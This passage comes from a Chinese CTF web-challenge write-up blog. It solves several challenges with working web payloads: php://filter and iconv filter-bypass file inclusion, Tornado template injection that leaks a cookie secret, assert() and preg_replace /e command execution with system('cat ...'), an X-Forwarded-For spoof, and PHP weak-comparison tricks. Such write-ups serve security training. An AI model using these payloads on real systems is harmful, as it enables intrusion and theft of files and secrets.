<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=&#x27;cat flag_1s_here/flag_831b69012c67b35f.php&#x27;</span><br><span class="line">for i in s:</span><br><span class="line">	print(oct(ord(i))[2:],end=&quot;\\&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag_1s_here/flag_831b69012c67b35f.php</span><br><span class="line">\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221025174912561.png" alt="image-20221025174912561"></p>
<p><code>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319</code></p>
<p><img data-src="/../images/WRITEUP/image-20221025174028059.png" alt="image-20221025174028059"></p>
<p>得到flag</p>
<p><code>cyberpeace&#123;29898fce096dde11f0f088c612f9ce32&#125;</code></p>
<h2 id="file-include-x2F-江苏工匠杯-1"><a href="#file-include-x2F-江苏工匠杯-1" class="headerlink" title="file_include&#x2F;江苏工匠杯(1)"></a>file_include&#x2F;江苏工匠杯(1)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">    include(&quot;./check.php&quot;);</span><br><span class="line">    if(isset($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">        $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">        include($filename);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>使用php伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?filename=php://filter/read=convert.base64-encode/resource=./check.php</span><br></pre></td></tr></table></figure>

<p>提示<code>do not hack!</code></p>
<p>原因是<code>check.php</code>中对多个字符进行了过滤（上述包括read、base）</p>
<p>可以用<code>iconv</code>，<a target="_blank" rel="noopener" href="https://www.coder.work/article/156675">iconv支持的编码</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?filename=php://filter/convert.iconv.utf8.utf16/resource=./check.php</span><br><span class="line">#iconv(input-encoding,output-encoding)</span><br><span class="line">/?filename=php://filter/convert.iconv.utf7.utf7/resource=./check.php</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://cyberchef.org/">万能解码工具</a></p>
<p>可以看到<code>check.php</code>中的内容，对部分字符都进行了过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if($_GET[&quot;filename&quot;])&#123; </span><br><span class="line">	$preg_match_username = &#x27;return preg_match(&quot;/base|be|encode|print|zlib|quoted|write|rot13|read|string/i&quot;, $_GET[&quot;filename&quot;]);&#x27;; </span><br><span class="line">	if (eval($preg_match_username)) &#123; </span><br><span class="line">		die(&quot;do not hack!&quot;); </span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>查看flag.php文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?filename=php://filter/convert.iconv.utf8.utf16/resource=./flag.php</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><code>cyberpeace&#123;b954ac143e52458bf33831a02681d948&#125;</code></p>
<h2 id="easyphp-x2F-江苏工匠杯-1"><a href="#easyphp-x2F-江苏工匠杯-1" class="headerlink" title="easyphp&#x2F;江苏工匠杯(1)"></a>easyphp&#x2F;江苏工匠杯(1)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$key1 = 0;</span><br><span class="line">$key2 = 0;</span><br><span class="line"></span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)&#123;</span><br><span class="line">    if(isset($b) &amp;&amp; &#x27;8b184b&#x27; === substr(md5($b),-6,6))&#123;</span><br><span class="line">        $key1 = 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;Emmm...再想想&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    die(&quot;Emmm...&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=(array)json_decode(@$_GET[&#x27;c&#x27;]);</span><br><span class="line">if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)&#123;</span><br><span class="line">    if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))&#123;</span><br><span class="line">        $d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);</span><br><span class="line">        $d === false?die(&quot;no...&quot;):NULL;</span><br><span class="line">        foreach($c[&quot;n&quot;] as $key=&gt;$val)&#123;</span><br><span class="line">            $val===&quot;DGGJ&quot;?die(&quot;no......&quot;):NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        $key2 = 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;no hack&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;no&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key1 &amp;&amp; $key2)&#123;</span><br><span class="line">    include &quot;Hgfks.php&quot;;</span><br><span class="line">    echo &quot;You&#x27;re right&quot;.&quot;\n&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里需要<code>len(a)≤3</code>，且取整值大于6000000，可以传<code>a=1e9</code></p>
<p>需要<code>md5(b)[-6,-1]===&#39;8b184b&#39;</code>，这里需要爆破一下，得到结果<code>b=53724</code></p>
<p><img data-src="/../images/WRITEUP/image-20221102171131428.png" alt="image-20221102171131428"></p>
<p>参数c需要传一个<code>json编码后的数组</code>，且<code>c[&quot;m&quot;]不是数字&amp;c[&quot;m&quot;]&gt;2022</code>，即<code>c[&quot;m&quot;]=&#39;2023a&#39;</code></p>
<p><code>c[&quot;n&quot;]</code>需要包含两个元素且第一个元素需要是数组，且后面需要c[“n”]中包含字符串<code>DGGJ</code>，即<code>c[&quot;n&quot;]=[[1],&quot;DGGJ&quot;]</code></p>
<p>但是又有一个循环遍历<code>c[&quot;n&quot;]</code>，如果出现<code>DGGJ</code>就Die了</p>
<p>那就只能在<code>array_search()</code>上想办法，因为这里没有设置strict参数，可以用<code>0 == &#39;DGGJ&#39;</code>，即<code>c[&quot;n&quot;]=[1],0</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;2023a&quot;,&quot;n&quot;:[[1,2,3],0]&#125;c=&#123;&quot;m&quot;:&quot;2023a&quot;,&quot;n&quot;:[[1],0]&#125;</span><br><span class="line">//这里用单引号会报错</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><code>cyberpeace&#123;c994b9366b8a342a494047cedee1e812&#125;</code></p>
<h2 id="easytornado-x2F-护网杯-3"><a href="#easytornado-x2F-护网杯-3" class="headerlink" title="easytornado&#x2F;护网杯(3)"></a>easytornado&#x2F;护网杯(3)</h2><p>在&#x2F;<code>flag.txt</code>提示flag在<code>/fllllllllllllag</code>中，且查看url可以发现传了两个参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/hints.txt&amp;filehash=2598a04e7cc8a8a459f0679b95e33982</span><br></pre></td></tr></table></figure>

<p>在<code>/hint.txt</code>中可以看到hash值的计算方法是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>

<p>所以关键是找到<code>cookie_secret</code>值</p>
<p>根据提示<code>Tornado框架</code>和<code>render</code>渲染函数，猜测需要利用模板注入漏洞来找到flag</p>
<p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>重定向到<code>http://61.147.171.105:53261/error?msg=Error</code>并提示Error</p>
<p>可能存在服务端模板注入攻击 （SSTI），尝试在当前页面进行模板注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>发现存在模板注入</p>
<p><img data-src="/../images/WRITEUP/image-20221109094634984.png" alt="image-20221109094634984"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，</span><br><span class="line">handler-&gt;RequestHandler</span><br><span class="line">RequestHandler.settings-&gt;self.application.settings</span><br><span class="line">所以handler.settings-&gt;RequestHandler.application.settings</span><br><span class="line">这里面是一些环境变量</span><br></pre></td></tr></table></figure>

<p>结果出现了<code>cookie_secret</code>的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c01d81b4-935c-4f0c-b3e7-eecbee4544c2</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221109095030350.png" alt="image-20221109095030350"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(&quot;/fllllllllllllag&quot;))</span><br><span class="line">a497d10f68a24eabcd104d2db8167ada</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=a497d10f68a24eabcd104d2db8167ada</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><code>flag&#123;3f39aea39db345769397ae895edb9c70&#125;</code></p>
<h2 id="simple-js-x2F-root-me-3"><a href="#simple-js-x2F-root-me-3" class="headerlink" title="simple_js&#x2F;root-me(3)"></a>simple_js&#x2F;root-me(3)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function dechiffre(pass_enc)&#123;</span><br><span class="line">	var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;</span><br><span class="line">	var tab  = pass_enc.split(&#x27;,&#x27;);</span><br><span class="line">    var tab2 = pass.split(&#x27;,&#x27;);</span><br><span class="line">    var i,j,k,l=0,m,n,o,p = &quot;&quot;;</span><br><span class="line">    i = 0;</span><br><span class="line">    j = tab.length;</span><br><span class="line">    k = j + (l) + (n=0);</span><br><span class="line">    n = tab2.length;</span><br><span class="line">    for(i = (o=0); i &lt; (k = j = n); i++ )</span><br><span class="line">    &#123;</span><br><span class="line">    	o = tab[i-l];</span><br><span class="line">    	p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">    	if(i == 5) break;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i = (o=0); i &lt; (k = j = n); i++ )</span><br><span class="line">    &#123;</span><br><span class="line">    	o = tab[i-l];</span><br><span class="line">    	if(i &gt; 5 &amp;&amp; i &lt; k-1)</span><br><span class="line">	    	p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    p += String.fromCharCode(tab2[17]);</span><br><span class="line">    pass = p;</span><br><span class="line">    return pass;</span><br><span class="line">&#125;</span><br><span class="line">String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));</span><br><span class="line"></span><br><span class="line"> h = window.prompt(&#x27;Enter password&#x27;);</span><br><span class="line"> alert( dechiffre(h) );</span><br></pre></td></tr></table></figure>

<p><code>dechiffre</code>函数其实就是将十进制转成字符</p>
<p>而想要获取的密码（flag）为下列结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;)</span><br></pre></td></tr></table></figure>

<p>这里需要将16进制转换成ascii后转成字符</p>
<p><a target="_blank" rel="noopener" href="http://ascii-converter.bchrt.com/">ascii、16进制、2进制、十进制、base64在线转换</a></p>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dechiffre(&quot;55,56,54,79,115,69,114,116,107,49,50&quot;)</span><br></pre></td></tr></table></figure>

<p>结果是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">786OsErtk12</span><br></pre></td></tr></table></figure>

<p>根据题目描述（<code>Flag格式为 Cyberpeace&#123;xxxxxxxxx&#125;</code>）得到flag</p>
<p>这里我还以为需要再次输入弹出框才能得到flag( ╯□╰ )</p>
<p><code>Cyberpeace&#123;786OsErtk12&#125;</code></p>
<h2 id="mfw-x2F-csaw-3"><a href="#mfw-x2F-csaw-3" class="headerlink" title="mfw&#x2F;csaw(3)"></a>mfw&#x2F;csaw(3)</h2><p>在<code>about页</code>说使用了<code>git</code>，可能存在<code>git泄露</code></p>
<p><img data-src="/../images/WRITEUP/image-20221109151630477.png" alt="image-20221109151630477"></p>
<p>访问<code>/.git</code>发现确实存在</p>
<p><img data-src="/../images/WRITEUP/image-20221109151712968.png" alt="image-20221109151712968"></p>
<p>使用<code>githack</code>工具获取泄露的内容，可以看到template目录下存在<code>flag.php</code>，然而内容为空</p>
<p><img data-src="/../images/WRITEUP/image-20221109151945741.png" alt="image-20221109151945741"></p>
<p>在<code>index.php</code>中存在如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;page&#x27;])) &#123;</span><br><span class="line">	$page = $_GET[&#x27;page&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">// TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">其中assert()函数其实是一个断言函数。assert函数在php语言中是用来判断一个表达式是否成立。返回true or false;</span><br><span class="line">assert ( mixed $assertion [, string $description ] ) : bool</span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br><span class="line"></span><br><span class="line">strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果没有找到则返回flase，</span><br></pre></td></tr></table></figure>

<p>因为并没有对输入进行过滤，可以构建语句闭合执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?page=&#x27;);//</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221109152958908.png" alt="image-20221109152958908"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?page=&#x27;).system(&#x27;cat+./templates/flag.php&#x27;);//</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221109153131832.png" alt="image-20221109153131832"></p>
<p>查看源代码，得到flag</p>
<p><img data-src="/../images/WRITEUP/image-20221109153155469.png" alt="image-20221109153155469"></p>
<p><code>cyberpeace&#123;2172f21f4199956826ac65ef621201b4&#125;</code></p>
<h2 id="ics-05-x2F-XCTF-3"><a href="#ics-05-x2F-XCTF-3" class="headerlink" title="ics-05&#x2F;XCTF(3)"></a>ics-05&#x2F;XCTF(3)</h2><p>把所有按钮全点一遍，发现只有一个按钮可以跳转</p>
<p><img data-src="/../images/WRITEUP/image-20221114153347755.png" alt="image-20221114153347755"></p>
<p><img data-src="/../images/WRITEUP/image-20221114153448215.png" alt="image-20221114153448215"></p>
<p>dirsearch的结果如下</p>
<p><img data-src="/../images/WRITEUP/image-20221114152643043.png" alt="image-20221114152643043"></p>
<p>访问<code>/index.php/login/</code>界面，点击超链接</p>
<p><img data-src="/../images/WRITEUP/image-20221114153641700.png" alt="image-20221114153641700"></p>
<p>可以看到后面接了个<code>/page=index</code></p>
<p><img data-src="/../images/WRITEUP/image-20221114153705586.png" alt="image-20221114153705586"></p>
<p>尝试使用PHP伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>得到一串base64编码后的结果</p>
<p>base64解码的结果（选取其中关键）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$page = $_GET[page];</span><br><span class="line"></span><br><span class="line">if (isset($page)) &#123;</span><br><span class="line">if (ctype_alnum($page)) &#123;</span><br><span class="line">?&gt;</span><br><span class="line">    &lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">?&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">            &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#x27;input&#x27;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#x27;ta:text&#x27;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#x27;text&#x27;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if ($page === &#x27;index.php&#x27;) &#123;</span><br><span class="line">                    die(&#x27;Ok&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">                    include($page);</span><br><span class="line">                    die();</span><br><span class="line">                ?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>其中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctype_alnum 要求字符串只能是数字和字母的组合(可以为纯数字/字母)</span><br><span class="line">strpos 查找字符串在另一字符串中第一次出现的位置，没有找到则返回flase</span><br><span class="line">preg_replace 执行一个正则表达式的搜索和替换。</span><br></pre></td></tr></table></figure>

<p>而后一段的php代码是破题关键</p>
<p>这里需要将<code>X_FORWARDED_FOR</code>这个参数改成<code>127.0.0.1</code>，也就是SSRF</p>
<p>然后需要传参<code>pat、rep、sub</code>，其中<code>preg_replace</code>函数可以进行代码执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?pat=/ab/e&amp;rep=system(&quot;ls&quot;)&amp;sub=abc</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221114155758483.png" alt="image-20221114155758483"></p>
<p>看一下这个很长的目录<code>s3chahahaDir</code></p>
<p><img data-src="/../images/WRITEUP/image-20221114155900113.png" alt="image-20221114155900113"></p>
<p>这个也是一个目录，再进一层能看到<code>flag.php</code></p>
<p><img data-src="/../images/WRITEUP/image-20221114160016149.png" alt="image-20221114160016149"></p>
<p>这里<code>cat</code>不显示，还以为还有什么点没注意到</p>
<p><img data-src="/../images/WRITEUP/image-20221114160141264.png" alt="image-20221114160141264"></p>
<p>在源码中可以看到<code>flag</code></p>
<p><img data-src="/../images/WRITEUP/image-20221114160234783.png" alt="image-20221114160234783"></p>
<p><code>cyberpeace&#123;311c896db1aff4f376207dda8e7a4157&#125;</code></p>
<h2 id="lottery-x2F-XCTF-3"><a href="#lottery-x2F-XCTF-3" class="headerlink" title="lottery&#x2F;XCTF(3)"></a>lottery&#x2F;XCTF(3)</h2><p>本例提供了附件，内容为网站的源码</p>
<p>附件中<code>robots.txt</code>中提示有<code>/.git</code>，可能存在git泄露</p>
<p><del>原来附件的内容就是git泄露的代码</del></p>
<p>本题需要先赚钱然后购买flag，而赚钱的唯一途径是购买彩票</p>
<p><img data-src="/../images/WRITEUP/image-20221121114333723.png" alt="image-20221121114333723"></p>
<p>在<code>buy.php</code>中存在弱比较漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for($i=0; $i&lt;7; $i++)&#123;</span><br><span class="line">    if($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">        $same_count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为<code>win_numbers[i]</code>为<code>0-9</code>，所以只要让<code>numers[i]</code>为<code>true</code>就行</p>
<p><img data-src="/../images/WRITEUP/image-20221121113904800.png" alt="image-20221121113904800"></p>
<p>然后就可以在<code>market.php</code>购买<code>flag</code>（可能需要多buy几次彩票赚钱）</p>
<p><img data-src="/../images/WRITEUP/image-20221121114236148.png" alt="image-20221121114236148"></p>
<p><code>cyberpeace&#123;c3a5f93792faa195cc74d669f514158c&#125;</code></p>
<h2 id="文件包含-x2F-泰山杯-4"><a href="#文件包含-x2F-泰山杯-4" class="headerlink" title="文件包含&#x2F;泰山杯(4)"></a>文件包含&#x2F;泰山杯(4)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">    include(&quot;./check.php&quot;);</span><br><span class="line">    if(isset($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">        $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">        include($filename);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

